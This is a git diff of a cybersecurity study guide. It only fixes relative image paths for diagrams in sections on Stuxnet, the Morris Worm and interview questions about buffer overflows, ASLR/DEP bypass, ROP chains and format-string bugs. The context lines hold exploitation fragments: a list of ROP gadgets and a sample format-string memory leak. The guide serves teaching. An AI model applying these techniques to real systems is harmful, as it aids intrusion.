-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-handwritten.svg" alt="Handwritten: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-handwritten.svg" alt="Handwritten: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-diagram.svg" alt="Diagram: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-diagram.svg" alt="Diagram: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-sticky.svg" alt="Sticky Note: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-3-stuxnet-2010-from-a-code-perspective-sticky.svg" alt="Sticky Note: 9.3 Stuxnet (2010) → From a Code Perspective" width="30%">
 </a>
 
 
@@ -2159,14 +2159,14 @@ int hooked_ReadS7Block(int blockNum, void *buffer) {
 
 ### 9.4 Morris Worm (1988) → First Internet Worm
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-handwritten.svg" alt="Handwritten: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-handwritten.svg" alt="Handwritten: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-diagram.svg" alt="Diagram: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-diagram.svg" alt="Diagram: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-sticky.svg" alt="Sticky Note: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-4-morris-worm-1988-first-internet-worm-sticky.svg" alt="Sticky Note: 9.4 Morris Worm (1988) → First Internet Worm" width="30%">
 </a>
 
 
@@ -2265,14 +2265,14 @@ int main() {
 
 ### Q1: What is a stack buffer overflow? Explain with stack frame layout.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-handwritten.svg" alt="Handwritten: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-handwritten.svg" alt="Handwritten: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-diagram.svg" alt="Diagram: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-diagram.svg" alt="Diagram: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-sticky.svg" alt="Sticky Note: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout-sticky.svg" alt="Sticky Note: What is a stack buffer overflow? Explain with stack frame layout." width="30%">
 </a>
 
 
@@ -2297,14 +2297,14 @@ When the buffer overflows, data spills from "local variables" up through saved E
 
 ### Q2: How does ASLR work and how can it be bypassed?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-handwritten.svg" alt="Handwritten: How does ASLR work and how can it be bypassed?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-handwritten.svg" alt="Handwritten: How does ASLR work and how can it be bypassed?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-diagram.svg" alt="Diagram: How does ASLR work and how can it be bypassed?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-diagram.svg" alt="Diagram: How does ASLR work and how can it be bypassed?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-sticky.svg" alt="Sticky Note: How does ASLR work and how can it be bypassed?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-work-and-how-can-it-be-bypassed-sticky.svg" alt="Sticky Note: How does ASLR work and how can it be bypassed?" width="30%">
 </a>
 
 
@@ -2318,14 +2318,14 @@ When the buffer overflows, data spills from "local variables" up through saved E
 
 ### Q3: Explain the difference between DEP/NX and how to bypass it.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-handwritten.svg" alt="Handwritten: Explain the difference between DEP/NX and how to bypass it." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-handwritten.svg" alt="Handwritten: Explain the difference between DEP/NX and how to bypass it." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-diagram.svg" alt="Diagram: Explain the difference between DEP/NX and how to bypass it." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-diagram.svg" alt="Diagram: Explain the difference between DEP/NX and how to bypass it." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-sticky.svg" alt="Sticky Note: Explain the difference between DEP/NX and how to bypass it." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-difference-between-dep-nx-and-how-to-bypass-it-sticky.svg" alt="Sticky Note: Explain the difference between DEP/NX and how to bypass it." width="30%">
 </a>
 
 
@@ -2335,14 +2335,14 @@ When the buffer overflows, data spills from "local variables" up through saved E
 
 ### Q4: What is a ROP chain? Walk through building one.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-handwritten.svg" alt="Handwritten: What is a ROP chain? Walk through building one." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-handwritten.svg" alt="Handwritten: What is a ROP chain? Walk through building one." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-diagram.svg" alt="Diagram: What is a ROP chain? Walk through building one." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-diagram.svg" alt="Diagram: What is a ROP chain? Walk through building one." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-sticky.svg" alt="Sticky Note: What is a ROP chain? Walk through building one." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-a-rop-chain-walk-through-building-one-sticky.svg" alt="Sticky Note: What is a ROP chain? Walk through building one." width="30%">
 </a>
 
 
@@ -2360,14 +2360,14 @@ Each bracket is 8 bytes on the stack. `ret` instructions advance execution throu
 
 ### Q5: How do you find gadgets for a ROP chain?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-handwritten.svg" alt="Handwritten: How do you find gadgets for a ROP chain?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-handwritten.svg" alt="Handwritten: How do you find gadgets for a ROP chain?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-diagram.svg" alt="Diagram: How do you find gadgets for a ROP chain?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-diagram.svg" alt="Diagram: How do you find gadgets for a ROP chain?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-sticky.svg" alt="Sticky Note: How do you find gadgets for a ROP chain?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-do-you-find-gadgets-for-a-rop-chain-sticky.svg" alt="Sticky Note: How do you find gadgets for a ROP chain?" width="30%">
 </a>
 
 
@@ -2387,14 +2387,14 @@ Key gadgets needed: `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`, `pop rax; re
 
 ### Q6: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context).
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-handwritten.svg" alt="Handwritten: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-handwritten.svg" alt="Handwritten: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-diagram.svg" alt="Diagram: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-diagram.svg" alt="Diagram: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-sticky.svg" alt="Sticky Note: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-n-1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context-sticky.svg" alt="Sticky Note: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context)." width="30%">
 </a>
 
 
@@ -2408,14 +2408,14 @@ Key gadgets needed: `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`, `pop rax; re
 
 ### Q7: What is the difference between a virus and a worm?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-handwritten.svg" alt="Handwritten: What is the difference between a virus and a worm?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-handwritten.svg" alt="Handwritten: What is the difference between a virus and a worm?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-diagram.svg" alt="Diagram: What is the difference between a virus and a worm?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-diagram.svg" alt="Diagram: What is the difference between a virus and a worm?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-sticky.svg" alt="Sticky Note: What is the difference between a virus and a worm?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-a-virus-and-a-worm-sticky.svg" alt="Sticky Note: What is the difference between a virus and a worm?" width="30%">
 </a>
 
 
@@ -2425,14 +2425,14 @@ The Morris Worm (1988) is the classic example of a worm: it propagated via finge
 
 ### Q8: How would you analyze a suspicious binary without running it?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-handwritten.svg" alt="Handwritten: How would you analyze a suspicious binary without running it?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-handwritten.svg" alt="Handwritten: How would you analyze a suspicious binary without running it?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-diagram.svg" alt="Diagram: How would you analyze a suspicious binary without running it?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-diagram.svg" alt="Diagram: How would you analyze a suspicious binary without running it?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-sticky.svg" alt="Sticky Note: How would you analyze a suspicious binary without running it?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-analyze-a-suspicious-binary-without-running-it-sticky.svg" alt="Sticky Note: How would you analyze a suspicious binary without running it?" width="30%">
 </a>
 
 
@@ -2448,14 +2448,14 @@ The Morris Worm (1988) is the classic example of a worm: it propagated via finge
 
 ### Q9: What is the Secure Software Development Lifecycle (SSDLC)?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-handwritten.svg" alt="Handwritten: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-handwritten.svg" alt="Handwritten: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-diagram.svg" alt="Diagram: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-diagram.svg" alt="Diagram: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-sticky.svg" alt="Sticky Note: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-secure-software-development-lifecycle-ssdlc-sticky.svg" alt="Sticky Note: What is the Secure Software Development Lifecycle (SSDLC)?" width="30%">
 </a>
 
 
@@ -2470,14 +2470,14 @@ The Morris Worm (1988) is the classic example of a worm: it propagated via finge
 
 ### Q10: Explain the SolarWinds attack in terms of the SSDLC.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-handwritten.svg" alt="Handwritten: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-handwritten.svg" alt="Handwritten: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-diagram.svg" alt="Diagram: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-diagram.svg" alt="Diagram: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-sticky.svg" alt="Sticky Note: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-the-solarwinds-attack-in-terms-of-the-ssdlc-sticky.svg" alt="Sticky Note: Explain the SolarWinds attack in terms of the SSDLC." width="30%">
 </a>
 
 
@@ -2492,14 +2492,14 @@ The Morris Worm (1988) is the classic example of a worm: it propagated via finge
 
 ### Q11: How does a format string vulnerability work?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-handwritten.svg" alt="Handwritten: How does a format string vulnerability work?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-handwritten.svg" alt="Handwritten: How does a format string vulnerability work?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-diagram.svg" alt="Diagram: How does a format string vulnerability work?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-diagram.svg" alt="Diagram: How does a format string vulnerability work?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-sticky.svg" alt="Sticky Note: How does a format string vulnerability work?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-a-format-string-vulnerability-work-sticky.svg" alt="Sticky Note: How does a format string vulnerability work?" width="30%">
 </a>
 
 
@@ -2518,14 +2518,14 @@ AAAAffffd500.f7f5f5c0.8048426.41414141    ← AAAA = 0x41414141 leaked from stac
 
 ### Q12: What tools would you use for Windows malware analysis?
 
